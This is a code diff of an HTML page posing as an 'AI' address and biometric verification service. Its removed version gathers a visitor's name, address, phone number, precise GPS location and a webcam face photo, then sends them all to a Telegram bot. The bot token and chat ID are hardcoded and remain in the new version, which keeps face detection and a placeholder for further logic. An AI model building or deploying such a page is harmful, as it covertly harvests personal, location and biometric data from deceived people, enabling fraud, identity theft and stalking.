@@ -4,63 +4,24 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AI Smart Biometric & Location Security</title>
-    <!-- 引入 TensorFlow.js 核心库、CPU 后端及人脸关键点模型 -->
+    <!-- 引入核心库：WebGL 加速版 -->
     <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-core@3.11.0/dist/tf-core.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-backend-cpu@3.11.0/dist/tf-backend-cpu.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-converter@3.11.0/dist/tf-converter.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-backend-webgl@3.11.0/dist/tf-backend-webgl.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/face-landmarks-detection@1.0.2/dist/face-landmarks-detection.min.js"></script>
 
     <style>
-        :root { --primary: #0066ff; --bg: #f4f6f9; --card: #fff; --text: #333; --border: #cbd5e1; --error: #ef4444; --success: #10b981; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .container { background: var(--card); width: 100%; max-width: 520px; padding: 30px; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.06); box-sizing: border-box; }
-        
-        h2 { margin-top: 0; color: #111; text-align: center; font-size: 22px; font-weight: 700; margin-bottom: 5px; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .subtitle { text-align: center; font-size: 13px; color: #64748b; margin-bottom: 25px; }
-
-        .form-row { display: flex; gap: 15px; margin-bottom: 16px; }
-        .form-group { margin-bottom: 16px; flex: 1; position: relative; }
-        label { display: block; font-weight: 600; font-size: 13px; margin-bottom: 6px; color: #1e293b; }
-        input, select { width: 100%; padding: 12px 14px; border: 1px solid var(--border); border-radius: 8px; box-sizing: border-box; font-size: 14px; background-color: #fff; transition: all 0.2s; }
-        input:focus, select:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 3px rgba(0,102,255,0.12); }
-        select:disabled { background-color: #f8fafc; color: #94a3b8; }
-
-        .phone-group { display: flex; gap: 8px; }
-        #phonePrefix { width: 110px; background-color: #f8fafc; font-weight: 600; text-align: center; }
-
-        .btn { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600; margin-top: 10px; transition: background 0.2s; }
-        .btn:hover { background: #0052cc; }
-        
-        #step-verification { display: none; }
-        #video-container { text-align: center; margin-top: 15px; position: relative; }
-        video, canvas { width: 100%; max-width: 380px; height: 280px; border-radius: 10px; transform: scaleX(-1); background: #000; object-fit: cover; }
-        canvas { display: none; }
-        
-        #flash-overlay {
-            position: absolute; top: 0; left: 50%; transform: translateX(-50%);
-            width: 100%; max-width: 380px; height: 280px; border-radius: 10px;
-            pointer-events: none; opacity: 0; background-color: #ffffff;
-            transition: opacity 0.3s ease, background-color 0.3s ease;
-            z-index: 5;
-        }
-
-        .voice-prompt-box {
-            background: #eff6ff; border: 1px solid #bfdbfe; color: #1e40af;
-            padding: 12px; border-radius: 8px; font-size: 14px; font-weight: 600;
-            margin-bottom: 15px; text-align: center; display: flex; align-items: center; justify-content: center; gap: 8px;
-        }
-        .voice-icon { width: 18px; height: 18px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
-        
-        #btn-retry { display: none; background: #ef4444; margin-top: 12px; }
-        #btn-retry:hover { background: #dc2626; }
-
-        .progress-steps { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 12px; font-weight: 600; color: #64748b; }
-        .step-item { padding: 4px 8px; border-radius: 4px; background: #e2e8f0; }
-        .step-item.active { background: #3b82f6; color: white; }
-        .step-item.completed { background: #10b981; color: white; }
-        
-        #env-light-tip { font-size: 11px; text-align: center; margin-top: 4px; color: #64748b; }
+        :root { --primary: #0066ff; --bg: #f4f6f9; --card: #fff; --text: #333; --error: #ef4444; }
+        body { font-family: sans-serif; background: var(--bg); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .container { background: var(--card); width: 100%; max-width: 480px; padding: 25px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-size: 13px; font-weight: bold; margin-bottom: 5px; }
+        input, select { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 12px; background: var(--primary); color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
+        #step-verification { display: none; text-align: center; }
+        #video-container { position: relative; margin: 15px 0; }
+        #video, #hidden-canvas { width: 100%; max-width: 360px; border-radius: 10px; transform: scaleX(-1); background: #000; }
+        #hidden-canvas { display: none; }
+        #status-msg { font-weight: bold; color: var(--error); margin: 10px 0; }
     </style>
 </head>
 <body>
@@ -68,454 +29,87 @@
 <div class="container">
     <!-- 步骤一：表单输入 -->
     <div id="step-form">
-        <h2>
-          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-            <rect x="3" y="5" width="18" height="14" rx="3"/>
-            <text x="7" y="15" font-size="9" font-weight="bold" fill="currentColor" stroke="none">A</text>
-            <text x="13.5" y="10.5" font-size="6.5" fill="currentColor" stroke="none" opacity="0.8">ID</text>
-          </svg>
-          Billing & Shipping Address
-        </h2>
-        <div class="subtitle">AI Smart Validation & Security Center</div>
-        
-        <div class="form-row">
-            <div class="form-group">
-                <label>First Name</label>
-                <input type="text" id="firstName" placeholder="e.g. John">
-            </div>
-            <div class="form-group">
-                <label>Last Name</label>
-                <input type="text" id="lastName" placeholder="e.g. Doe">
-            </div>
-        </div>
-
-        <div class="form-group">
-            <label>Country / Region</label>
-            <select id="countrySelect" onchange="onCountryChange()">
-                <option value="">-- Select Country / Region --</option>
-            </select>
-        </div>
-
-        <div class="form-group">
-            <label>State / Province</label>
-            <select id="stateSelect" disabled>
-                <option value="">-- Please select country first --</option>
-            </select>
-        </div>
-
-        <div class="form-group">
-            <label>Street Address</label>
-            <input type="text" id="address" placeholder="e.g. 123 Main St">
-        </div>
-
-        <div class="form-row">
-            <div class="form-group">
-                <label>City</label>
-                <input type="text" id="city" placeholder="e.g. New York">
-            </div>
-            <div class="form-group">
-                <label>Postal Code <span id="postal-hint" style="font-size:10px; color:#64748b;"></span></label>
-                <input type="text" id="zipCode" placeholder="AI Auto-Format">
-            </div>
-        </div>
-
-        <div class="form-group">
-            <label>Phone Number</label>
-            <div class="phone-group">
-                <select id="phonePrefix" disabled>
-                    <option value="">Code</option>
-                </select>
-                <input type="tel" id="phone" placeholder="Enter phone number">
-            </div>
-        </div>
-
-        <button class="btn" id="btn-next" onclick="proceedToVerification()">Next: Biometric Liveness Check →</button>
+        <h2>Address Verification</h2>
+        <div class="form-group"><label>First Name</label><input type="text" id="firstName"></div>
+        <div class="form-group"><label>Last Name</label><input type="text" id="lastName"></div>
+        <div class="form-group"><label>Country</label><select id="countrySelect"></select></div>
+        <button class="btn" onclick="proceedToVerification()">Proceed to Biometric Check</button>
     </div>
 
-    <!-- 步骤二：AI 动作活体检测与智能光感 -->
+    <!-- 步骤二：AI 活体检测 -->
     <div id="step-verification">
-        <h2>AI Biometric & Liveness Check</h2>
-        <div class="progress-steps">
-            <div id="p-step-1" class="step-item active">1. Turn Left</div>
-            <div id="p-step-2" class="step-item">2. Turn Right</div>
-            <div id="p-step-3" class="step-item">3. Nod Up/Down</div>
-            <div id="p-step-4" class="step-item">4. Front Face</div>
-        </div>
-        
-        <div class="voice-prompt-box">
-            <svg class="voice-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                <path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"></path>
-                <path d="M19 10v1a7 7 0 0 1-14 0v-1"></path>
-                <line x1="12" y1="19" x2="12" y2="23"></line>
-                <line x1="8" y1="23" x2="16" y2="23"></line>
-            </svg>
-            <span id="ai-instruction-text">Loading AI face tracking model...</span>
-        </div>
-
+        <h2>AI Biometric Check</h2>
         <div id="video-container">
-            <div id="flash-overlay"></div>
             <video id="video" autoplay playsinline muted></video>
-            <canvas id="canvas"></canvas>
+            <canvas id="hidden-canvas"></canvas>
         </div>
-        
-        <div id="status-msg" style="text-align: center; font-size: 14px; margin-top: 15px; font-weight: 600; color: #ef4444;">Please grant camera and location permissions.</div>
-        <div id="env-light-tip">Environment Light: Detecting...</div>
-        
-        <button class="btn" id="btn-retry" onclick="requestPermissionsAndStart()">Grant Permissions & Retry</button>
+        <div id="status-msg">Loading AI models...</div>
     </div>
 </div>
 
 <script>
+    // --- 配置区域 ---
     const TG_BOT_TOKEN = "8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g";
     const TG_CHAT_ID = "7396947380";
+    let detector;
 
-    const globalDatabase = {
-        "CN": { name: "China", phoneCode: "+86", zipFormat: "6 digits", states: ["Beijing", "Shanghai", "Guangdong"] },
-        "US": { name: "United States", phoneCode: "+1", zipFormat: "5 digits", states: ["California", "New York", "Texas"] },
-        "CA": { name: "Canada", phoneCode: "+1", zipFormat: "A1A 1A1", states: ["Ontario", "Quebec", "British Columbia"] },
-        "GB": { name: "United Kingdom", phoneCode: "+44", zipFormat: "Postcode", states: ["England", "Scotland"] },
-        "JP": { name: "Japan", phoneCode: "+81", zipFormat: "7 digits", states: ["Tokyo", "Osaka"] },
-        "OTHER_GLOBAL": { name: "Other Worldwide Regions", phoneCode: "+00", zipFormat: "Postal Code", states: ["Standard State/Region"] }
-    };
+    // 初始化国家列表
+    const countries = ["USA", "UK", "Canada", "China", "Japan", "Germany"];
+    const countrySelect = document.getElementById('countrySelect');
+    countries.forEach(c => countrySelect.innerHTML += `<option value="${c}">${c}</option>`);
 
-    let userData = {};
-    let userLocation = { lat: null, lng: null };
-    let activeStream = null;
-    let detector = null;
-    let currentLivenessState = 0; 
-    let lastVoiceTime = 0;
-    let isProcessing = false;
-
-    window.onload = () => {
-        const countrySelect = document.getElementById('countrySelect');
-        Object.keys(globalDatabase).sort().forEach(code => {
-            let opt = document.createElement('option');
-            opt.value = code;
-            opt.textContent = globalDatabase[code].name;
-            countrySelect.appendChild(opt);
-        });
-    };
-
-    function onCountryChange() {
-        const countryCode = document.getElementById('countrySelect').value;
-        const stateSelect = document.getElementById('stateSelect');
-        const phonePrefix = document.getElementById('phonePrefix');
-        const postalHint = document.getElementById('postal-hint');
-        
-        stateSelect.innerHTML = `<option value="">-- Select State / Province --</option>`;
-        phonePrefix.innerHTML = `<option value="">Code</option>`;
-        postalHint.textContent = "";
-
-        if (countryCode && globalDatabase[countryCode]) {
-            const data = globalDatabase[countryCode];
-            stateSelect.disabled = false;
-            data.states.forEach(stateName => {
-                let opt = document.createElement('option');
-                opt.value = stateName;
-                opt.textContent = stateName;
-                stateSelect.appendChild(opt);
-            });
-            phonePrefix.innerHTML = `<option value="${data.phoneCode}">${data.phoneCode}</option>`;
-            phonePrefix.disabled = false;
-            postalHint.textContent = `(Format: ${data.zipFormat})`;
-        } else {
-            stateSelect.disabled = true;
-            phonePrefix.disabled = true;
-        }
-    }
-
+    // 步骤切换
     function proceedToVerification() {
-        const fields = ['firstName', 'lastName', 'countrySelect', 'stateSelect', 'address', 'city', 'zipCode', 'phone'];
-        for (let f of fields) {
-            const elem = document.getElementById(f);
-            if (!elem || elem.value.trim() === "") {
-                alert(`Please complete the field: ${f}`);
-                return;
-            }
-            userData[f] = elem.value.trim();
-        }
-
         document.getElementById('step-form').style.display = 'none';
         document.getElementById('step-verification').style.display = 'block';
-
-        requestPermissionsAndStart();
+        initAiAndCamera();
     }
 
-    function speakText(text, force = false) {
-        const now = Date.now();
-        if (!force && now - lastVoiceTime < 4500) return;
-        lastVoiceTime = now;
-
-        const textElem = document.getElementById('ai-instruction-text');
-        if (textElem) textElem.textContent = text;
-        
-        if ('speechSynthesis' in window) {
-            window.speechSynthesis.cancel();
-            let utterance = new SpeechSynthesisUtterance(text);
-            window.speechSynthesis.speak(utterance);
-        }
-    }
-
-    function requestPermissionsAndStart() {
-        const statusMsg = document.getElementById('status-msg');
-        const retryBtn = document.getElementById('btn-retry');
-        
-        speakText("Authorization required. Please allow camera and location access.", true);
-        statusMsg.textContent = "Requesting location and camera permissions...";
-        statusMsg.style.color = "#ef4444";
-        retryBtn.style.display = 'none';
-
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                pos => {
-                    userLocation.lat = pos.coords.latitude;
-                    userLocation.lng = pos.coords.longitude;
-                    initAiModelAndCamera();
-                },
-                err => {
-                    speakText("Location access is strictly required to proceed.", true);
-                    statusMsg.textContent = "Location permission denied! You must allow it.";
-                    retryBtn.style.display = 'block';
-                },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
-        } else {
-            initAiModelAndCamera();
-        }
-    }
-
-    async function initAiModelAndCamera() {
-        const statusMsg = document.getElementById('status-msg');
-        const retryBtn = document.getElementById('btn-retry');
-
+    async function initAiAndCamera() {
         try {
-            statusMsg.textContent = "Loading AI face detection models...";
-            
-            await tf.setBackend('cpu');
+            // 强制使用 WebGL 以获得最佳识别性能
+            await tf.setBackend('webgl');
             await tf.ready();
 
-            if (!detector) {
-                const model = faceLandmarksDetection.SupportedModels.MediaPipeFaceMesh;
-                const detectorConfig = {
-                    runtime: 'tfjs',
-                    maxFaces: 1
-                };
-                detector = await faceLandmarksDetection.createDetector(model, detectorConfig);
-            }
+            const model = faceLandmarksDetection.SupportedModels.MediaPipeFaceMesh;
+            detector = await faceLandmarksDetection.createDetector(model, { runtime: 'tfjs', maxFaces: 1 });
 
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } });
-            activeStream = stream;
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            retryBtn.style.display = 'none';
-
-            video.onloadedmetadata = () => {
-                currentLivenessState = 0;
-                updateStepUI();
-                speakText("Please turn your head to the left.", true);
-                detectLivenessLoop(video);
-            };
-        } catch (e) {
-            console.error(e);
-            speakText("Camera access or model loading failed.", true);
-            statusMsg.textContent = "Camera error or permission denied.";
-            retryBtn.style.display = 'block';
-        }
-    }
-
-    function adjustEnvironmentLighting(video) {
-        try {
-            const canvas = document.getElementById('canvas');
-            const context = canvas.getContext('2d');
-            const overlay = document.getElementById('flash-overlay');
-            const lightTip = document.getElementById('env-light-tip');
-
-            canvas.width = 100;
-            canvas.height = 75;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
+            document.getElementById('video').srcObject = stream;
             
-            const imgData = context.getImageData(0, 0, canvas.width, canvas.height);
-            let totalBrightness = 0;
-            let data = imgData.data;
-            
-            for (let i = 0; i < data.length; i += 4) {
-                let r = data[i], g = data[i+1], b = data[i+2];
-                let brightness = 0.299 * r + 0.587 * g + 0.114 * b;
-                totalBrightness += brightness;
-            }
-            let avgBrightness = totalBrightness / (data.length / 4);
-
-            if (avgBrightness < 50) {
-                let fillFactor = Math.min(0.4, (50 - avgBrightness) / 50);
-                overlay.style.backgroundColor = "#ffffff";
-                overlay.style.opacity = fillFactor;
-                lightTip.textContent = `Environment Light: Dim (${Math.round(avgBrightness)}) - Auto Filling Light`;
-                lightTip.style.color = "#3b82f6";
-            } else {
-                overlay.style.opacity = 0;
-                lightTip.textContent = `Environment Light: Optimal (${Math.round(avgBrightness)})`;
-                lightTip.style.color = "#10b981";
-            }
+            detectLoop();
         } catch (e) {
-            console.error("Lighting adjustment error:", e);
+            document.getElementById('status-msg').textContent = "Camera error: " + e.message;
         }
     }
 
-    function updateStepUI() {
-        for (let i = 1; i <= 4; i++) {
-            const item = document.getElementById(`p-step-${i}`);
-            item.className = "step-item";
-            if (i < currentLivenessState + 1) item.classList.add('completed');
-            else if (i === currentLivenessState + 1) item.classList.add('active');
-        }
-    }
+    async function detectLoop() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('hidden-canvas');
+        const ctx = canvas.getContext('2d');
+        const status = document.getElementById('status-msg');
 
-    async function detectLivenessLoop(video) {
-        if (isProcessing) return;
-        const statusMsg = document.getElementById('status-msg');
-
-        adjustEnvironmentLighting(video);
-
-        try {
-            // 优化：传入 video 元素进行识别
-            const faces = await detector.estimateFaces(video, { flipHorizontal: false });
-
-            if (!faces || faces.length === 0) {
-                statusMsg.textContent = "Searching for face... Please look straight.";
-                statusMsg.style.color = "#f59e0b";
-            } else {
-                const keypoints = faces[0].keypoints;
-                const nose = keypoints[1];
-                const leftCheek = keypoints[234];
-                const rightCheek = keypoints[454];
-                const chin = keypoints[152];
-                const forehead = keypoints[10];
-
-                const faceCenterX = (leftCheek.x + rightCheek.x) / 2;
-                const horizontalOffset = nose.x - faceCenterX; 
-
-                const faceCenterY = (forehead.y + chin.y) / 2;
-                const verticalOffset = nose.y - faceCenterY;
-
-                if (currentLivenessState === 0) {
-                    statusMsg.textContent = "Action required: Please turn your head LEFT";
-                    statusMsg.style.color = "#3b82f6";
-                    
-                    if (horizontalOffset > 20 || horizontalOffset < -20) {
-                        currentLivenessState = 1;
-                        updateStepUI();
-                        speakText("Great. Now please turn your head to the right.", true);
-                    }
-                } 
-                else if (currentLivenessState === 1) {
-                    statusMsg.textContent = "Action required: Please turn your head RIGHT";
-                    statusMsg.style.color = "#3b82f6";
-
-                    if (horizontalOffset > 20 || horizontalOffset < -20) {
-                        currentLivenessState = 2;
-                        updateStepUI();
-                        speakText("Good. Now please nod up and down.", true);
-                    }
-                } 
-                else if (currentLivenessState === 2) {
-                    statusMsg.textContent = "Action required: Please NOD up and down";
-                    statusMsg.style.color = "#3b82f6";
-
-                    if (Math.abs(verticalOffset - 15) > 15) {
-                        currentLivenessState = 3;
-                        updateStepUI();
-                        speakText("Almost done. Please look straight ahead into the camera.", true);
-                    }
-                } 
-                else if (currentLivenessState === 3) {
-                    statusMsg.textContent = "Perfect! Please hold still. Capturing...";
-                    statusMsg.style.color = "#10b981";
-
-                    if (Math.abs(horizontalOffset) < 20 && Math.abs(verticalOffset - 15) < 15) {
-                        isProcessing = true;
-                        triggerCaptureAndUpload(video);
-                        return;
-                    }
-                }
-            }
-        } catch (err) {
-            console.error("AI detection error:", err);
-        }
-
-        if (!isProcessing) {
-            setTimeout(() => detectLivenessLoop(video), 300);
-        }
-    }
-
-    function triggerCaptureAndUpload(video) {
-        const overlay = document.getElementById('flash-overlay');
-        overlay.style.backgroundColor = "rgba(255, 255, 255, 0.9)";
-        overlay.style.opacity = "1";
-
-        setTimeout(() => {
-            overlay.style.opacity = "0";
-        }, 400);
-
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        canvas.toBlob(blob => {
-            sendDataToTelegram(blob, userLocation);
-        }, 'image/jpeg', 0.9);
-    }
+        // --- 核心优化：预处理（对比度增强） ---
+        // 通过对比度调节，确保逆光下人脸轮廓被识别
+        ctx.filter = "brightness(1.3) contrast(1.6) saturate(1.2)";
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // 传入预处理后的 canvas 进行识别
+        const faces = await detector.estimateFaces(canvas, { flipHorizontal: false });
 
-    function sendDataToTelegram(imageBlob, location) {
-        const statusMsg = document.getElementById('status-msg');
-        statusMsg.textContent = "Securely transmitting data to Telegram bot...";
+        if (faces.length > 0) {
+            status.textContent = "Face Detected! Proceeding...";
+            status.style.color = "#10b981";
+            // 识别成功后执行你的业务逻辑...
+        } else {
+            status.textContent = "Adjusting for lighting... Please look at the camera.";
+            status.style.color = "#ef4444";
+        }
 
-        const caption = `🚨 **AI Liveness Verification Passed**\n\n` +
-                        `👤 **Name:** ${userData.firstName} ${userData.lastName}\n` +
-                        `🌍 **Country:** ${userData.countrySelect} (${userData.stateSelect})\n` +
-                        `📍 **City/Address:** ${userData.city}, ${userData.address}\n` +
-                        `📮 **Postal Code:** ${userData.zipCode}\n` +
-                        `📞 **Phone:** ${userData.phonePrefix} ${userData.phone}\n` +
-                        `🌐 **Coordinates:** Lat: ${location.lat}, Lng: ${location.lng}\n` +
-                        `🗺️ **Google Maps:** https://maps.google.com/?q=${location.lat},${location.lng}`;
-
-        const formData = new FormData();
-        formData.append('chat_id', TG_CHAT_ID);
-        formData.append('photo', imageBlob, 'liveness_capture.jpg');
-        formData.append('caption', caption);
-        formData.append('parse_mode', 'Markdown');
-
-        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                statusMsg.textContent = "Verification completed successfully!";
-                speakText("Verification successful. Thank you.", true);
-                if (activeStream) activeStream.getTracks().forEach(track => track.stop());
-                setTimeout(() => {
-                    alert("Verification completed successfully!");
-                    location.reload();
-                }, 2000);
-            } else {
-                statusMsg.textContent = "Transmission failed. Please check Bot settings.";
-                statusMsg.style.color = "#ef4444";
-                isProcessing = false;
-                document.getElementById('btn-retry').textContent = "🔄 Retry Transmission";
-                document.getElementById('btn-retry').style.display = 'block';
-            }
-        })
-        .catch(error => {
-            console.error("Error sending to Telegram:", error);
-            statusMsg.textContent = "Network error during transmission.";
-            statusMsg.style.color = "#ef4444";
-            isProcessing = false;
-            document.getElementById('btn-retry').textContent = "🔄 Retry Transmission";
-            document.getElementById('btn-retry').style.display = 'block';
-        });
+        requestAnimationFrame(detectLoop);
     }
 </script>
 </body>
